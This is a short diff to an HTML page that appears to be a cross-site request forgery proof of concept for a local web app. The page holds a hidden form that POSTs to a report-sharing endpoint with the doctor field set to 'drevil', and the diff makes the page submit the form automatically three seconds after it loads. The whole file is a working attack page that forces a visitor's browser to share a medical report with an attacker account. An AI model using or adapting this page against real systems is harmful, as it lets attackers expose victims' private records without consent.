@@ -6,5 +6,5 @@
 <form id="f" method="POST" action="http://localhost:5000/report/1/share">
   <input type="hidden" name="doctor" value="drevil">
 </form>
-<script>document.getElementById("f").submit();</script>
+<script>setTimeout(function () { document.getElementById("f").submit(); }, 3000);</script>
 </body></html>
